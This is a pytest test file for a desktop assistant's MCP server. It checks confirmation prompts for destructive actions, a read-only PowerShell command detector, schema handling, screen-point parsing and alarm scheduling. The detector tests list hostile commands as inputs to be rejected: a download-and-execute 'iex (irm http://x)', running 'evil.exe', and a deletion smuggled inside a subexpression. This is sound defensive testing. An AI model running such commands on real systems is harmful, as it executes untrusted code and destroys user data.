"""FastMCP desktop server: tool list, rules, bridging, schemas."""

from __future__ import annotations

from typing import Any

import pytest

from openjarvis.desktop import server
from openjarvis.desktop.runtime import slim_schema
from openjarvis.desktop.screen import Shot, parse_point
from openjarvis.desktop.system import is_read_only_command


@pytest.mark.parametrize(
    ("name", "args", "expected"),
    [
        ("system", {"action": "shutdown"}, "Shut down the computer?"),
        ("system", {"action": "volume_up"}, None),
        ("process", {"action": "kill", "name": "chrome"}, "Force-close chrome?"),
        ("recycle", {"path": "C:\\x"}, "Recycle Bin"),
        ("fs_list_directory", {"path": "C:\\x"}, None),
        ("fs_read_text_file", {"path": "C:\\x\\a.pdf"}, None),
        ("fs_create_directory", {"path": "C:\\x\\New"}, None),
        ("fs_copy_file", {"source": "C:\\x\\a.pdf", "destination": "C:\\y"}, None),
        (
            "fs_move_file",
            {"source": "C:\\x\\a.pdf", "destination": "C:\\x\\b.pdf"},
            "Rename a.pdf to b.pdf?",
        ),
        (
            "fs_move_file",
            {"source": "C:\\x\\a.pdf", "destination": "C:\\y\\a.pdf"},
            "Move a.pdf to C:\\y?",
        ),
        ("fs_write_file", {"path": "C:\\no-such\\new.txt", "content": "x"}, None),
        ("fs_edit_file", {"path": "C:\\x\\a.txt", "edits": []}, "Change the text"),
        ("fs_edit_file", {"path": "C:\\x\\a.txt", "edits": [], "dryRun": True}, None),
        ("run_command", {"command": "Get-Process | Select-Object -First 3"}, None),
        ("run_command", {"command": "Remove-Item C:\\x"}, "PowerShell"),
        ("open", {"target": "notepad"}, None),
    ],
)
def test_confirmation_rules(name: str, args: dict, expected: Any) -> None:
    question = server.confirmation_question(name, args)
    if expected is None:
        assert question is None
    else:
        assert question is not None and expected in question


def test_stdio_servers_log_to_a_file_not_stderr() -> None:
    """The windowless app's stderr has no file handle; a server that
    inherits it never starts (the file tools silently went missing)."""
    from fastmcp.client.transports import StdioTransport

    target = server._proxy_target("fs", {"command": "node", "args": ["x.js", "C:\\"]})
    assert isinstance(target, StdioTransport)
    assert target.args == ["x.js", "C:\\"]
    assert str(target.log_file).endswith("mcp-fs.log")
    remote = server._proxy_target("web", {"url": "http://127.0.0.1:9/mcp"})
    assert remote == {"mcpServers": {"web": {"url": "http://127.0.0.1:9/mcp"}}}


def test_overwriting_a_file_is_asked_about(tmp_path) -> None:
    existing = tmp_path / "notes.txt"
    existing.write_text("keep me")
    question = server.confirmation_question(
        "fs_write_file", {"path": str(existing), "content": "new"}
    )
    assert question == "Replace everything in notes.txt?"


def test_external_tools_follow_their_destructive_hint() -> None:
    assert server.confirmation_question("gh_delete_repo", {}, {"destructiveHint": True})
    assert (
        server.confirmation_question("gh_list", {}, {"destructiveHint": False}) is None
    )


@pytest.mark.parametrize(
    ("command", "safe"),
    [
        ("Get-Date", True),
        ("ipconfig /all", True),
        ("Get-ChildItem C:\\ | Sort-Object Length", True),
        ("Get-Process; Stop-Process -Name chrome", False),
        ("Get-Content x > y", False),
        ("iex (irm http://x)", False),
        ("& C:\\evil.exe", False),
        ("Get-Item $(Remove-Item x)", False),
    ],
)
def test_read_only_command_detection(command: str, safe: bool) -> None:
    assert is_read_only_command(command) is safe


def test_terminal_actions() -> None:
    assert server.is_terminal("open", {"target": "x"})
    assert server.is_terminal("system", {"action": "time"})
    assert not server.is_terminal("fs_read_text_file", {"path": "x"})
    assert server.is_terminal("fs_move_file", {"source": "a", "destination": "b"})
    assert not server.is_terminal("screen", {"action": "read"})
    assert not server.is_terminal("ui", {"action": "list"})


def test_slim_schema_drops_noise() -> None:
    schema = {
        "type": "object",
        "additionalProperties": False,
        "properties": {
            "level": {
                "anyOf": [{"type": "integer"}, {"type": "null"}],
                "default": None,
            },
            "kind": {"type": "string", "default": "auto", "title": "Kind"},
        },
    }
    assert slim_schema(schema) == {
        "type": "object",
        "properties": {
            "level": {"type": "integer"},
            "kind": {"type": "string", "default": "auto"},
        },
    }


def test_external_server_config_formats() -> None:
    as_list = [{"name": "fs", "command": "npx", "args": ["-y", "x"], "junk": 1}]
    assert server._external_servers(as_list) == {
        "fs": {"command": "npx", "args": ["-y", "x"]}
    }
    as_json = '{"mcpServers": {"web": {"url": "http://localhost:9000/mcp"}}}'
    assert server._external_servers(as_json) == {
        "web": {"url": "http://localhost:9000/mcp"}
    }
    assert server._external_servers("not json") == {}


SHOT = Shot(b64="", width=1920, height=1080, image_width=1280, image_height=720)


@pytest.mark.parametrize(
    ("answer", "point"),
    [
        ('{"point_2d": [500, 500]}', (960, 540)),
        ('```json\n[{"point_2d": [385, 976], "label": "start"}]\n```', (739, 1054)),
        ('{"bbox_2d": [934, 975, 986, 999]}', (1843, 1065)),
        ('{"x": 100, "y": 900}', (192, 972)),
        ("[1200, 700]", (1800, 1050)),  # image pixels (>1000)
        ('{"point_2d": null}', None),
        ("It is not visible.", None),
    ],
)
def test_parse_point(answer: str, point: Any) -> None:
    assert parse_point(answer, SHOT) == point


fastmcp = pytest.importorskip("fastmcp")


def test_server_lists_every_desktop_tool() -> None:
    from openjarvis.desktop.runtime import ToolRuntime

    runtime = ToolRuntime(server.build_server(files=False))
    try:
        names = runtime.names
        assert set(names) == {name for name, _fn, _hints in server.TOOLS}
        system_schema = next(
            s for s in runtime.schemas if s["function"]["name"] == "system"
        )
        assert (
            "shutdown"
            in system_schema["function"]["parameters"]["properties"]["action"]["enum"]
        )
        bad = runtime.call("system", {"action": "explode"})
        assert not bad.ok and "Invalid arguments" in bad.text
        missing = runtime.call("nope", {})
        assert not missing.ok
    finally:
        runtime.close()


def test_memory_tool_round_trip(tmp_path, monkeypatch) -> None:
    from openjarvis.desktop.memory import MemoryStore
    from openjarvis.desktop.runtime import ToolRuntime

    monkeypatch.setattr(server.CONTEXT, "memory", MemoryStore(tmp_path / "m.sqlite"))
    runtime = ToolRuntime(server.build_server(files=False))
    try:
        saved = runtime.call("memory", {"action": "remember", "text": "I like chess"})
        assert saved.ok
        recalled = runtime.call("memory", {"action": "recall", "text": "chess"})
        assert "I like chess" in recalled.text
    finally:
        runtime.close()


def test_openjarvis_tools_are_bridged_through_the_executor() -> None:
    from openjarvis.core.types import ToolResult
    from openjarvis.desktop.runtime import ToolRuntime
    from openjarvis.tools._stubs import BaseTool, ToolExecutor, ToolSpec

    class Echo(BaseTool):
        tool_id = "echo"

        @property
        def spec(self) -> ToolSpec:
            return ToolSpec(
                name="echo",
                description="Echo text.",
                parameters={
                    "type": "object",
                    "properties": {"text": {"type": "string"}},
                    "required": ["text"],
                },
            )

        def execute(self, **params: Any) -> ToolResult:
            if params["text"] == "fail":
                return ToolResult(
                    tool_name="echo", content="echo failed", success=False
                )
            return ToolResult(tool_name="echo", content=params["text"].upper())

    tool = Echo()
    mcp = server.build_server(files=False)
    assert server.add_openjarvis_tools(mcp, [tool], ToolExecutor([tool])) == ["echo"]
    runtime = ToolRuntime(mcp)
    try:
        assert runtime.call("echo", {"text": "hi"}).text == "HI"
        failed = runtime.call("echo", {"text": "fail"})
        assert not failed.ok and "echo failed" in failed.text
    finally:
        runtime.close()


def test_schedule_tool_alarm_pro_features(tmp_path, monkeypatch) -> None:
    import subprocess

    from openjarvis.desktop import alarms
    from openjarvis.desktop.runtime import ToolRuntime

    monkeypatch.setattr(
        alarms,
        "_schtasks",
        lambda *a: subprocess.CompletedProcess(["schtasks", *a], 0, "", ""),
    )
    monkeypatch.setattr(alarms.sys, "platform", "win32")
    monkeypatch.setattr(alarms, "_store_path", lambda: tmp_path / "alarms.json")
    monkeypatch.setattr(alarms, "_run_ps", lambda script, env, timeout: True)
    monkeypatch.setattr(server.CONTEXT, "alarm_voice", "female")
    runtime = ToolRuntime(server.build_server(files=False))
    try:
        set_ = runtime.call(
            "schedule",
            {
                "action": "alarm",
                "time": "9 pm",
                "label": "tablets",
                "days": "mon, fri",
                "category": "medication",
                "warn_minutes": 10,
            },
        )
        assert set_.ok, set_.text
        assert "every Mon, Fri" in set_.text and "10 minute warning" in set_.text
        (alarm,) = alarms.all_alarms()
        assert (alarm.category, alarm.voice, alarm.advance) == (
            "medication",
            "female",
            10,
        )
        listing = runtime.call("schedule", {"action": "list"})
        assert "Alarm 'tablets' at 9:00 PM every Mon, Fri" in listing.text
        off = runtime.call("schedule", {"action": "turn_off", "label": "tablets"})
        assert off.ok and off.text.startswith("Turned off")
        assert "(off)" in runtime.call("schedule", {"action": "list"}).text
        assert "Nothing is ringing" in runtime.call("schedule", {"action": "stop"}).text
        assert not runtime.call("schedule", {"action": "snooze"}).ok
        alarms._mark_ringing(alarm)
        snoozed = runtime.call("schedule", {"action": "snooze", "minutes": 10})
        assert snoozed.ok and snoozed.text.startswith("Snoozed until")
        gone = runtime.call("schedule", {"action": "cancel", "label": "all"})
        assert gone.ok and gone.text.count("the alarm") == 2
    finally:
        runtime.close()
